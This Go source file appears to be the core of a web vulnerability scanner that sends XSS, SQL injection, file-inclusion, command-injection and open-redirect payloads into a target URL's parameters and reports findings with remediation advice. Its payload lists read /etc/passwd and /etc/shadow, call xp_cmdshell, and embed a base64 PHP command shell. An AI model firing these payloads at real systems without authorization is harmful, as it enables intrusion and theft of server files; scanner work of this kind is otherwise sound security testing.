package vuln

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"
)

// VulnType represents vulnerability type
type VulnType string

const (
	VulnXSS     VulnType = "XSS"
	VulnSQLi    VulnType = "SQLi"
	VulnLFI     VulnType = "LFI"
	VulnRFI     VulnType = "RFI"
	VulnSSRF    VulnType = "SSRF"
	VulnCmdInj  VulnType = "Command Injection"
	VulnHeaders VulnType = "Security Headers"
	VulnOpen    VulnType = "Open Redirect"
)

// Severity levels
type Severity string

const (
	SeverityCritical Severity = "CRITICAL"
	SeverityHigh     Severity = "HIGH"
	SeverityMedium   Severity = "MEDIUM"
	SeverityLow      Severity = "LOW"
	SeverityInfo     Severity = "INFO"
)

// VulnResult represents a vulnerability finding
type VulnResult struct {
	Type        VulnType
	Severity    Severity
	URL         string
	Parameter   string
	Payload     string
	Evidence    string
	Description string
	Remediation string
}

// ScanOptions holds scanning configuration
type ScanOptions struct {
	URL          string
	Method       string
	Headers      map[string]string
	Cookie       string
	UserAgent    string
	Timeout      int
	Threads      int
	Insecure     bool
	FollowRedir  bool
	Verbose      bool
	PayloadLevel int // 1=basic, 2=normal, 3=aggressive
}

// XSS Payloads
var XSSPayloads = map[int][]string{
	1: { // Basic
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"'\"><script>alert(1)</script>",
	},
	2: { // Normal
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"'\"><script>alert(1)</script>",
		"<body onload=alert(1)>",
		"<iframe src=\"javascript:alert(1)\">",
		"<input onfocus=alert(1) autofocus>",
		"<marquee onstart=alert(1)>",
		"<details open ontoggle=alert(1)>",
		"<audio src=x onerror=alert(1)>",
		"javascript:alert(1)",
		"<img src=\"x\" onerror=\"alert(1)\">",
		"'-alert(1)-'",
		"\"-alert(1)-\"",
	},
	3: { // Aggressive
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"'\"><script>alert(1)</script>",
		"<body onload=alert(1)>",
		"<iframe src=\"javascript:alert(1)\">",
		"<input onfocus=alert(1) autofocus>",
		"<marquee onstart=alert(1)>",
		"<details open ontoggle=alert(1)>",
		"<audio src=x onerror=alert(1)>",
		"javascript:alert(1)",
		"<img src=\"x\" onerror=\"alert(1)\">",
		"'-alert(1)-'",
		"\"-alert(1)-\"",
		"<ScRiPt>alert(1)</ScRiPt>",
		"<scr<script>ipt>alert(1)</scr</script>ipt>",
		"<img/src=x onerror=alert(1)>",
		"<svg/onload=alert(1)>",
		"<<script>script>alert(1)<</script>/script>",
		"<script>alert(String.fromCharCode(88,83,83))</script>",
		"<img src=x:alert(alt) onerror=eval(src) alt=1>",
		"<svg><script>alert(1)</script></svg>",
		"%3Cscript%3Ealert(1)%3C/script%3E",
		"&#60;script&#62;alert(1)&#60;/script&#62;",
		"<script>eval(atob('YWxlcnQoMSk='))</script>",
	},
}

// SQLi Payloads
var SQLiPayloads = map[int][]string{
	1: { // Basic
		"'",
		"\"",
		"' OR '1'='1",
		"\" OR \"1\"=\"1",
		"1 OR 1=1",
	},
	2: { // Normal
		"'",
		"\"",
		"' OR '1'='1",
		"\" OR \"1\"=\"1",
		"1 OR 1=1",
		"' OR '1'='1' --",
		"' OR '1'='1' #",
		"') OR ('1'='1",
		"1' ORDER BY 1--",
		"1' ORDER BY 10--",
		"1 UNION SELECT NULL--",
		"1' AND '1'='1",
		"1' AND SLEEP(5)--",
		"1' WAITFOR DELAY '0:0:5'--",
		"1; SELECT * FROM users--",
	},
	3: { // Aggressive
		"'",
		"\"",
		"' OR '1'='1",
		"\" OR \"1\"=\"1",
		"1 OR 1=1",
		"' OR '1'='1' --",
		"' OR '1'='1' #",
		"') OR ('1'='1",
		"1' ORDER BY 1--",
		"1' ORDER BY 10--",
		"1 UNION SELECT NULL--",
		"1' AND '1'='1",
		"1' AND SLEEP(5)--",
		"1' WAITFOR DELAY '0:0:5'--",
		"1; SELECT * FROM users--",
		"admin'--",
		"' UNION SELECT 1,2,3--",
		"' UNION SELECT NULL,NULL,NULL--",
		"1' AND 1=1 UNION SELECT 1,2,3--",
		"' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
		"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
		"1;EXEC xp_cmdshell('dir')--",
		"1' AND BENCHMARK(5000000,MD5('test'))--",
		"' OR ''='",
		"' OR 1=1 LIMIT 1--",
		"') UNION SELECT * FROM users WHERE ('1'='1",
		"0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z",
	},
}

// LFI Payloads
var LFIPayloads = map[int][]string{
	1: { // Basic
		"../../../etc/passwd",
		"..\\..\\..\\windows\\win.ini",
		"/etc/passwd",
	},
	2: { // Normal
		"../../../etc/passwd",
		"..\\..\\..\\windows\\win.ini",
		"/etc/passwd",
		"....//....//....//etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"/etc/passwd%00",
		"php://filter/convert.base64-encode/resource=/etc/passwd",
		"php://input",
		"file:///etc/passwd",
	},
	3: { // Aggressive
		"../../../etc/passwd",
		"..\\..\\..\\windows\\win.ini",
		"/etc/passwd",
		"....//....//....//etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"/etc/passwd%00",
		"php://filter/convert.base64-encode/resource=/etc/passwd",
		"php://input",
		"file:///etc/passwd",
		"/var/log/apache2/access.log",
		"/var/log/nginx/access.log",
		"/proc/self/environ",
		"expect://id",
		"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
		"..%c0%af..%c0%af..%c0%afetc/passwd",
		"..%255c..%255c..%255cetc/passwd",
		"/etc/shadow",
		"/etc/hosts",
		"/etc/apache2/apache2.conf",
		"/etc/nginx/nginx.conf",
		"/var/www/html/config.php",
		"php://filter/read=convert.base64-encode/resource=index.php",
	},
}

// Command Injection Payloads
var CmdInjPayloads = map[int][]string{
	1: { // Basic
		"; id",
		"| id",
		"&& id",
	},
	2: { // Normal
		"; id",
		"| id",
		"&& id",
		"|| id",
		"`id`",
		"$(id)",
		"; ls -la",
		"| cat /etc/passwd",
		"; whoami",
		"& ping -c 5 127.0.0.1 &",
	},
	3: { // Aggressive
		"; id",
		"| id",
		"&& id",
		"|| id",
		"`id`",
		"$(id)",
		"; ls -la",
		"| cat /etc/passwd",
		"; whoami",
		"& ping -c 5 127.0.0.1 &",
		"\n/bin/cat /etc/passwd",
		"a]); system('id');//",
		"| type c:\\windows\\win.ini",
		"& dir c:\\ &",
		"; sleep 5",
		"| sleep 5",
		"%0aid",
		"';id;'",
		"\"|id;\"",
	},
}

// Open Redirect Payloads
var OpenRedirectPayloads = []string{
	"//evil.com",
	"https://evil.com",
	"/\\evil.com",
	"////evil.com",
	"https:evil.com",
	"//evil.com/%2f..",
	"///evil.com",
	"////evil.com/",
	"https://evil.com/redirect",
	"//evil%E3%80%82com",
}

// SQL error patterns
var SQLErrorPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)SQL syntax.*MySQL`),
	regexp.MustCompile(`(?i)Warning.*mysql_`),
	regexp.MustCompile(`(?i)valid MySQL result`),
	regexp.MustCompile(`(?i)MySqlClient\.`),
	regexp.MustCompile(`(?i)PostgreSQL.*ERROR`),
	regexp.MustCompile(`(?i)Warning.*pg_`),
	regexp.MustCompile(`(?i)valid PostgreSQL result`),
	regexp.MustCompile(`(?i)Npgsql\.`),
	regexp.MustCompile(`(?i)Driver.* SQL[\-\_\ ]*Server`),
	regexp.MustCompile(`(?i)OLE DB.* SQL Server`),
	regexp.MustCompile(`(?i)SQLServer JDBC Driver`),
	regexp.MustCompile(`(?i)Microsoft SQL Native Client error`),
	regexp.MustCompile(`(?i)ODBC SQL Server Driver`),
	regexp.MustCompile(`(?i)SQLSrv`),
	regexp.MustCompile(`(?i)ORA-[0-9][0-9][0-9][0-9]`),
	regexp.MustCompile(`(?i)Oracle error`),
	regexp.MustCompile(`(?i)Oracle.*Driver`),
	regexp.MustCompile(`(?i)Warning.*oci_`),
	regexp.MustCompile(`(?i)Warning.*ora_`),
	regexp.MustCompile(`(?i)CLI Driver.*DB2`),
	regexp.MustCompile(`(?i)DB2 SQL error`),
	regexp.MustCompile(`(?i)SQLite/JDBCDriver`),
	regexp.MustCompile(`(?i)SQLite.Exception`),
	regexp.MustCompile(`(?i)System.Data.SQLite`),
	regexp.MustCompile(`(?i)Warning.*sqlite_`),
	regexp.MustCompile(`(?i)Warning.*SQLite3::`),
	regexp.MustCompile(`(?i)SQLITE_ERROR`),
	regexp.MustCompile(`(?i)SQL error.*POS([0-9]+)`),
	regexp.MustCompile(`(?i)Unclosed quotation mark`),
	regexp.MustCompile(`(?i)syntax error at or near`),
	regexp.MustCompile(`(?i)You have an error in your SQL`),
}

// LFI success patterns
var LFISuccessPatterns = []*regexp.Regexp{
	regexp.MustCompile(`root:.*:0:0:`),             // /etc/passwd
	regexp.MustCompile(`\[extensions\]`),           // win.ini
	regexp.MustCompile(`; for 16-bit app support`), // win.ini
	regexp.MustCompile(`\[boot loader\]`),          // boot.ini
	regexp.MustCompile(`HTTP_USER_AGENT`),          // /proc/self/environ
	regexp.MustCompile(`DOCUMENT_ROOT`),            // /proc/self/environ
	regexp.MustCompile(`<?php`),                    // PHP source
	regexp.MustCompile(`<\?=`),                     // PHP short tag
	regexp.MustCompile(`PD9waHA`),                  // base64 encoded <?php
	regexp.MustCompile(`DocumentRoot`),             // Apache config
	regexp.MustCompile(`server_name`),              // Nginx config
}

// TestXSS tests for XSS vulnerabilities
func TestXSS(opts ScanOptions, resultChan chan<- VulnResult) {
	payloads := XSSPayloads[opts.PayloadLevel]
	if payloads == nil {
		payloads = XSSPayloads[2]
	}

	client := createClient(opts)
	parsedURL, err := url.Parse(opts.URL)
	if err != nil {
		return
	}

	params := parsedURL.Query()
	sem := make(chan struct{}, opts.Threads)
	var wg sync.WaitGroup

	for param := range params {
		for _, payload := range payloads {
			wg.Add(1)
			sem <- struct{}{}

			go func(p, pay string) {
				defer wg.Done()
				defer func() { <-sem }()

				testURL := buildTestURL(parsedURL, p, pay)
				resp, body, err := doRequest(client, testURL, opts)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				// Check if payload is reflected
				if strings.Contains(body, pay) || strings.Contains(body, strings.ReplaceAll(pay, "\"", "&quot;")) {
					resultChan <- VulnResult{
						Type:        VulnXSS,
						Severity:    SeverityHigh,
						URL:         testURL,
						Parameter:   p,
						Payload:     pay,
						Evidence:    "Payload reflected in response",
						Description: "Cross-Site Scripting (XSS) vulnerability detected. User input is reflected in the response without proper encoding.",
						Remediation: "Implement proper output encoding. Use Content-Security-Policy headers. Validate and sanitize user input.",
					}
				}
			}(param, payload)
		}
	}

	wg.Wait()
}

// TestSQLi tests for SQL injection vulnerabilities
func TestSQLi(opts ScanOptions, resultChan chan<- VulnResult) {
	payloads := SQLiPayloads[opts.PayloadLevel]
	if payloads == nil {
		payloads = SQLiPayloads[2]
	}

	client := createClient(opts)
	parsedURL, err := url.Parse(opts.URL)
	if err != nil {
		return
	}

	params := parsedURL.Query()
	sem := make(chan struct{}, opts.Threads)
	var wg sync.WaitGroup

	// Get baseline response
	baseResp, baseBody, err := doRequest(client, opts.URL, opts)
	if err != nil {
		return
	}
	baseResp.Body.Close()
	baseLen := len(baseBody)

	for param := range params {
		for _, payload := range payloads {
			wg.Add(1)
			sem <- struct{}{}

			go func(p, pay string) {
				defer wg.Done()
				defer func() { <-sem }()

				testURL := buildTestURL(parsedURL, p, pay)
				start := time.Now()
				resp, body, err := doRequest(client, testURL, opts)
				elapsed := time.Since(start)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				// Check for SQL errors
				for _, pattern := range SQLErrorPatterns {
					if pattern.MatchString(body) {
						resultChan <- VulnResult{
							Type:        VulnSQLi,
							Severity:    SeverityCritical,
							URL:         testURL,
							Parameter:   p,
							Payload:     pay,
							Evidence:    fmt.Sprintf("SQL error detected: %s", pattern.String()),
							Description: "Error-based SQL Injection vulnerability detected. The application reveals SQL errors in responses.",
							Remediation: "Use parameterized queries. Implement proper error handling. Never expose database errors.",
						}
						return
					}
				}

				// Check for time-based injection
				if strings.Contains(pay, "SLEEP") || strings.Contains(pay, "WAITFOR") || strings.Contains(pay, "BENCHMARK") {
					if elapsed > 4*time.Second {
						resultChan <- VulnResult{
							Type:        VulnSQLi,
							Severity:    SeverityCritical,
							URL:         testURL,
							Parameter:   p,
							Payload:     pay,
							Evidence:    fmt.Sprintf("Response delayed: %v", elapsed),
							Description: "Time-based blind SQL Injection vulnerability detected. The application response time indicates SQL execution.",
							Remediation: "Use parameterized queries. Implement proper input validation.",
						}
						return
					}
				}

				// Check for content-based differences (boolean-based)
				if strings.Contains(pay, "OR") && strings.Contains(pay, "=") {
					lenDiff := len(body) - baseLen
					if lenDiff > 100 || lenDiff < -100 {
						resultChan <- VulnResult{
							Type:        VulnSQLi,
							Severity:    SeverityHigh,
							URL:         testURL,
							Parameter:   p,
							Payload:     pay,
							Evidence:    fmt.Sprintf("Content length difference: %d bytes", lenDiff),
							Description: "Potential boolean-based SQL Injection detected. Response content varies significantly with injection payload.",
							Remediation: "Use parameterized queries. Validate input strictly.",
						}
					}
				}
			}(param, payload)
		}
	}

	wg.Wait()
}

// TestLFI tests for Local File Inclusion vulnerabilities
func TestLFI(opts ScanOptions, resultChan chan<- VulnResult) {
	payloads := LFIPayloads[opts.PayloadLevel]
	if payloads == nil {
		payloads = LFIPayloads[2]
	}

	client := createClient(opts)
	parsedURL, err := url.Parse(opts.URL)
	if err != nil {
		return
	}

	params := parsedURL.Query()
	sem := make(chan struct{}, opts.Threads)
	var wg sync.WaitGroup

	for param := range params {
		for _, payload := range payloads {
			wg.Add(1)
			sem <- struct{}{}

			go func(p, pay string) {
				defer wg.Done()
				defer func() { <-sem }()

				testURL := buildTestURL(parsedURL, p, pay)
				resp, body, err := doRequest(client, testURL, opts)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				// Check for LFI success patterns
				for _, pattern := range LFISuccessPatterns {
					if pattern.MatchString(body) {
						resultChan <- VulnResult{
							Type:        VulnLFI,
							Severity:    SeverityCritical,
							URL:         testURL,
							Parameter:   p,
							Payload:     pay,
							Evidence:    fmt.Sprintf("Pattern matched: %s", pattern.String()),
							Description: "Local File Inclusion vulnerability detected. The application allows reading arbitrary files from the server.",
							Remediation: "Validate file paths strictly. Use allowlists for permitted files. Disable dangerous PHP wrappers.",
						}
						return
					}
				}
			}(param, payload)
		}
	}

	wg.Wait()
}

// TestCommandInjection tests for command injection vulnerabilities
func TestCommandInjection(opts ScanOptions, resultChan chan<- VulnResult) {
	payloads := CmdInjPayloads[opts.PayloadLevel]
	if payloads == nil {
		payloads = CmdInjPayloads[2]
	}

	client := createClient(opts)
	parsedURL, err := url.Parse(opts.URL)
	if err != nil {
		return
	}

	params := parsedURL.Query()
	sem := make(chan struct{}, opts.Threads)
	var wg sync.WaitGroup

	// Command output patterns
	cmdPatterns := []*regexp.Regexp{
		regexp.MustCompile(`uid=\d+.*gid=\d+`),             // id command
		regexp.MustCompile(`root:.*:0:0:`),                 // /etc/passwd
		regexp.MustCompile(`\[boot loader\]`),              // boot.ini
		regexp.MustCompile(`Directory of [A-Z]:\\`),        // dir command
		regexp.MustCompile(`total \d+`),                    // ls command
		regexp.MustCompile(`(root|www-data|apache|nginx)`), // whoami
	}

	for param := range params {
		for _, payload := range payloads {
			wg.Add(1)
			sem <- struct{}{}

			go func(p, pay string) {
				defer wg.Done()
				defer func() { <-sem }()

				testURL := buildTestURL(parsedURL, p, pay)
				start := time.Now()
				resp, body, err := doRequest(client, testURL, opts)
				elapsed := time.Since(start)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				// Check for command output
				for _, pattern := range cmdPatterns {
					if pattern.MatchString(body) {
						resultChan <- VulnResult{
							Type:        VulnCmdInj,
							Severity:    SeverityCritical,
							URL:         testURL,
							Parameter:   p,
							Payload:     pay,
							Evidence:    fmt.Sprintf("Command output detected: %s", pattern.String()),
							Description: "Command Injection vulnerability detected. The application executes arbitrary system commands.",
							Remediation: "Never pass user input directly to system commands. Use allowlists for permitted commands. Implement strict input validation.",
						}
						return
					}
				}

				// Check for time-based injection (sleep)
				if strings.Contains(pay, "sleep") || strings.Contains(pay, "ping") {
					if elapsed > 4*time.Second {
						resultChan <- VulnResult{
							Type:        VulnCmdInj,
							Severity:    SeverityCritical,
							URL:         testURL,
							Parameter:   p,
							Payload:     pay,
							Evidence:    fmt.Sprintf("Response delayed: %v", elapsed),
							Description: "Time-based Command Injection vulnerability detected.",
							Remediation: "Never pass user input to system commands. Use parameterized APIs when possible.",
						}
					}
				}
			}(param, payload)
		}
	}

	wg.Wait()
}

// TestOpenRedirect tests for open redirect vulnerabilities
func TestOpenRedirect(opts ScanOptions, resultChan chan<- VulnResult) {
	client := createClient(opts)
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	parsedURL, err := url.Parse(opts.URL)
	if err != nil {
		return
	}

	params := parsedURL.Query()

	// Common redirect parameter names
	redirectParams := []string{"url", "redirect", "return", "next", "goto", "target", "dest", "destination", "rurl", "return_url", "continue"}

	for param := range params {
		// Check if this looks like a redirect parameter
		isRedirectParam := false
		for _, rp := range redirectParams {
			if strings.Contains(strings.ToLower(param), rp) {
				isRedirectParam = true
				break
			}
		}

		for _, payload := range OpenRedirectPayloads {
			testURL := buildTestURL(parsedURL, param, payload)
			resp, _, err := doRequest(client, testURL, opts)
			if err != nil {
				continue
			}

			location := resp.Header.Get("Location")
			if resp.StatusCode >= 300 && resp.StatusCode < 400 {
				if strings.Contains(location, "evil.com") {
					severity := SeverityMedium
					if isRedirectParam {
						severity = SeverityHigh
					}
					resultChan <- VulnResult{
						Type:        VulnOpen,
						Severity:    severity,
						URL:         testURL,
						Parameter:   param,
						Payload:     payload,
						Evidence:    fmt.Sprintf("Redirect to: %s", location),
						Description: "Open Redirect vulnerability detected. The application redirects to user-controlled URLs.",
						Remediation: "Validate redirect URLs against an allowlist. Use relative URLs when possible.",
					}
				}
			}
			resp.Body.Close()
		}
	}
}

// ScanSecurityHeaders analyzes security headers
func ScanSecurityHeaders(opts ScanOptions) []VulnResult {
	var results []VulnResult

	client := createClient(opts)
	resp, _, err := doRequest(client, opts.URL, opts)
	if err != nil {
		return results
	}
	defer resp.Body.Close()

	headers := resp.Header

	// Check for missing security headers
	securityHeaders := map[string]struct {
		severity    Severity
		description string
		remediation string
	}{
		"Strict-Transport-Security": {
			SeverityMedium,
			"Missing HSTS header. The application may be vulnerable to SSL stripping attacks.",
			"Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains' header.",
		},
		"Content-Security-Policy": {
			SeverityMedium,
			"Missing CSP header. The application may be vulnerable to XSS attacks.",
			"Implement a Content-Security-Policy header to restrict resource loading.",
		},
		"X-Content-Type-Options": {
			SeverityLow,
			"Missing X-Content-Type-Options header. The browser may MIME-sniff responses.",
			"Add 'X-Content-Type-Options: nosniff' header.",
		},
		"X-Frame-Options": {
			SeverityMedium,
			"Missing X-Frame-Options header. The application may be vulnerable to clickjacking.",
			"Add 'X-Frame-Options: DENY' or 'SAMEORIGIN' header.",
		},
		"X-XSS-Protection": {
			SeverityLow,
			"Missing X-XSS-Protection header. Browser XSS filter may not be enabled.",
			"Add 'X-XSS-Protection: 1; mode=block' header (note: deprecated in favor of CSP).",
		},
		"Referrer-Policy": {
			SeverityLow,
			"Missing Referrer-Policy header. Sensitive information may leak in referrer.",
			"Add 'Referrer-Policy: strict-origin-when-cross-origin' header.",
		},
		"Permissions-Policy": {
			SeverityLow,
			"Missing Permissions-Policy header. Browser features are not restricted.",
			"Add Permissions-Policy header to control browser features.",
		},
	}

	for header, info := range securityHeaders {
		if headers.Get(header) == "" {
			results = append(results, VulnResult{
				Type:        VulnHeaders,
				Severity:    info.severity,
				URL:         opts.URL,
				Parameter:   header,
				Evidence:    "Header not present",
				Description: info.description,
				Remediation: info.remediation,
			})
		}
	}

	// Check for dangerous headers
	if server := headers.Get("Server"); server != "" {
		if strings.Contains(server, "/") {
			results = append(results, VulnResult{
				Type:        VulnHeaders,
				Severity:    SeverityInfo,
				URL:         opts.URL,
				Parameter:   "Server",
				Evidence:    server,
				Description: "Server version disclosed. This may help attackers identify vulnerabilities.",
				Remediation: "Remove or obfuscate the Server header version information.",
			})
		}
	}

	if powered := headers.Get("X-Powered-By"); powered != "" {
		results = append(results, VulnResult{
			Type:        VulnHeaders,
			Severity:    SeverityInfo,
			URL:         opts.URL,
			Parameter:   "X-Powered-By",
			Evidence:    powered,
			Description: "Technology stack disclosed via X-Powered-By header.",
			Remediation: "Remove the X-Powered-By header.",
		})
	}

	// Check for insecure cookie flags
	for _, cookie := range resp.Cookies() {
		issues := []string{}
		if !cookie.Secure {
			issues = append(issues, "missing Secure flag")
		}
		if !cookie.HttpOnly {
			issues = append(issues, "missing HttpOnly flag")
		}
		if cookie.SameSite == http.SameSiteDefaultMode || cookie.SameSite == http.SameSiteNoneMode {
			issues = append(issues, "weak SameSite policy")
		}

		if len(issues) > 0 {
			results = append(results, VulnResult{
				Type:        VulnHeaders,
				Severity:    SeverityMedium,
				URL:         opts.URL,
				Parameter:   fmt.Sprintf("Cookie: %s", cookie.Name),
				Evidence:    strings.Join(issues, ", "),
				Description: "Cookie security flags are not properly set.",
				Remediation: "Set Secure, HttpOnly, and SameSite=Strict flags on sensitive cookies.",
			})
		}
	}

	return results
}

// QuickScan performs a quick vulnerability scan
func QuickScan(opts ScanOptions, resultChan chan<- VulnResult, doneChan chan<- bool) {
	defer func() { doneChan <- true }()

	// Test security headers first
	headerResults := ScanSecurityHeaders(opts)
	for _, r := range headerResults {
		resultChan <- r
	}

	var wg sync.WaitGroup

	// Run all tests concurrently
	wg.Add(5)

	go func() {
		defer wg.Done()
		TestXSS(opts, resultChan)
	}()

	go func() {
		defer wg.Done()
		TestSQLi(opts, resultChan)
	}()

	go func() {
		defer wg.Done()
		TestLFI(opts, resultChan)
	}()

	go func() {
		defer wg.Done()
		TestCommandInjection(opts, resultChan)
	}()

	go func() {
		defer wg.Done()
		TestOpenRedirect(opts, resultChan)
	}()

	wg.Wait()
}

// Helper functions

func createClient(opts ScanOptions) *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: opts.Insecure,
		},
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: opts.Threads,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   time.Duration(opts.Timeout) * time.Second,
	}

	if !opts.FollowRedir {
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}
	}

	return client
}

func doRequest(client *http.Client, targetURL string, opts ScanOptions) (*http.Response, string, error) {
	method := opts.Method
	if method == "" {
		method = "GET"
	}

	req, err := http.NewRequest(method, targetURL, nil)
	if err != nil {
		return nil, "", err
	}

	if opts.UserAgent != "" {
		req.Header.Set("User-Agent", opts.UserAgent)
	} else {
		req.Header.Set("User-Agent", "RaxuisCLI-VulnScanner/1.0")
	}

	if opts.Cookie != "" {
		req.Header.Set("Cookie", opts.Cookie)
	}

	for key, value := range opts.Headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, "", err
	}

	body, _ := io.ReadAll(resp.Body)
	return resp, string(body), nil
}

func buildTestURL(parsedURL *url.URL, param, payload string) string {
	query := parsedURL.Query()
	query.Set(param, payload)
	parsedURL.RawQuery = query.Encode()
	return parsedURL.String()
}

// DisplayResults displays vulnerability results
func DisplayResults(results []VulnResult) {
	if len(results) == 0 {
		fmt.Println("\n[NO VULNERABILITIES FOUND]")
		return
	}

	fmt.Println("\n[VULNERABILITY SCAN RESULTS]")
	fmt.Println(strings.Repeat("=", 80))

	// Group by severity
	bySeverity := map[Severity][]VulnResult{
		SeverityCritical: {},
		SeverityHigh:     {},
		SeverityMedium:   {},
		SeverityLow:      {},
		SeverityInfo:     {},
	}

	for _, r := range results {
		bySeverity[r.Severity] = append(bySeverity[r.Severity], r)
	}

	// Summary
	fmt.Printf("\nSummary:\n")
	fmt.Printf("  Critical: %d\n", len(bySeverity[SeverityCritical]))
	fmt.Printf("  High:     %d\n", len(bySeverity[SeverityHigh]))
	fmt.Printf("  Medium:   %d\n", len(bySeverity[SeverityMedium]))
	fmt.Printf("  Low:      %d\n", len(bySeverity[SeverityLow]))
	fmt.Printf("  Info:     %d\n", len(bySeverity[SeverityInfo]))

	// Display by severity
	for _, severity := range []Severity{SeverityCritical, SeverityHigh, SeverityMedium, SeverityLow, SeverityInfo} {
		vulns := bySeverity[severity]
		if len(vulns) == 0 {
			continue
		}

		fmt.Printf("\n[%s]\n", severity)
		fmt.Println(strings.Repeat("-", 40))

		for i, v := range vulns {
			fmt.Printf("\n%d. %s\n", i+1, v.Type)
			fmt.Printf("   URL: %s\n", truncate(v.URL, 70))
			if v.Parameter != "" {
				fmt.Printf("   Parameter: %s\n", v.Parameter)
			}
			if v.Payload != "" {
				fmt.Printf("   Payload: %s\n", truncate(v.Payload, 50))
			}
			fmt.Printf("   Evidence: %s\n", truncate(v.Evidence, 60))
			fmt.Printf("   Description: %s\n", v.Description)
			fmt.Printf("   Remediation: %s\n", v.Remediation)
		}
	}

	fmt.Println()
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}

// GetPayloads returns payloads for a specific vulnerability type
func GetPayloads(vulnType VulnType, level int) []string {
	switch vulnType {
	case VulnXSS:
		if p, ok := XSSPayloads[level]; ok {
			return p
		}
		return XSSPayloads[2]
	case VulnSQLi:
		if p, ok := SQLiPayloads[level]; ok {
			return p
		}
		return SQLiPayloads[2]
	case VulnLFI:
		if p, ok := LFIPayloads[level]; ok {
			return p
		}
		return LFIPayloads[2]
	case VulnCmdInj:
		if p, ok := CmdInjPayloads[level]; ok {
			return p
		}
		return CmdInjPayloads[2]
	case VulnOpen:
		return OpenRedirectPayloads
	default:
		return nil
	}
}
